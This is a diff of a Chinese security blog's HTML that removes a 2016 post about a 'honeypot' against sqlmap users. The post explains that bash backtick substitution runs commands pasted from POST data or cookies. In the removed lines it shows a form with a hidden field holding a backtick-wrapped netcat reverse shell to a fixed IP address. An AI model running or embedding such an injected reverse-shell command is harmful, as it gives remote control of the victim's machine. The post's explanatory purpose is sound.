@@ -644,100 +644,6 @@ var_dump(in_array($a,$b));
             
               
                 
-                <a class="post-title-link" href="/2016/10/22/sqlmap-honey/" itemprop="url">
-                  sqlmap中的“蜜罐”
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-10-22T00:31:09+08:00" content="2016-10-22">
-              2016-10-22
-            </time>
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="记录一次很有意思的小实验"><a href="#记录一次很有意思的小实验" class="headerlink" title="记录一次很有意思的小实验"></a>记录一次很有意思的小实验</h1><p>&#160; &#160; &#160; &#160;前几天在freebuf上看到了一篇很有意思的文章，<a href="http://www.yilan.io/article/5805a294a3dd044f5a2ba81d" target="_blank" rel="external">原文链接</a>，在这篇文章中，作者讲了一个很有意思的事情，我们都知道sqlmap是一个渗透测试的神器，很多人都会使用它来sql注入，但如果没有注意看数据中的内容，就有可能中招。<br>&#160; &#160; &#160; &#160;sqlmap都运行在bash下，而在bash中，有着这样一个小特性，就是当我们输入的内容中含有”`command`“，那么command将会被执行并返回结果。来试一下：<br><img src="http://oeix47n80.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-10-22%20%E4%B8%8A%E5%8D%8812.42.08.png" alt=""><br>&#160; &#160; &#160; &#160;从上面一段可以看到ls命令被成功执行了，而在第二条命令中，！！则代表了上一条指令，这也是bash的一个功能，另外，！＋n（数字）则代表之前的第n条指令。<br>&#160; &#160; &#160; &#160;之后我们来想想sqlmap的执行命令，sqlmap中有一个参数–data=”……”,还有一个是–cookie=”……”,他们分别代表了需要post提交的数据和用户的cookie，试想一下，如果我们是网站的开发者，我们就可以在post数据或者cookie中做手脚，我们在其中完全可以插入一条我们想要在攻击者电脑上执行的命令，而如果攻击者没有仔细阅读post数据或者cookie中的内容，而是选择直接复制粘贴的话，那么攻击者就可以被我们攻击了。来做个实验来测试一下。<br>&#160; &#160; &#160; &#160;首先，我们构造一个网站，这个网站可以post提交数据，我们在数据中插入一条nc命令，并让它在后台执行<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;padding-top:200px;"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"login_ret.php"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"data"</span> <span class="attr">value</span>=<span class="string">"`setsid nc 123.207.63.246 1234 -e /bin/bash`"</span> &gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">"font-size:25px"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"subit"</span> <span class="attr">value</span>=<span class="string">"Injection"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span>	</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
                 <a class="post-title-link" href="/2016/10/19/Object-Injection/" itemprop="url">
                   PHP中反序列化引起的安全问题
                 </a>
@@ -1137,7 +1043,7 @@ $row=mysql_fetch_array(mysql_query($sql));
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">7</span>
+              <span class="site-state-item-count">6</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
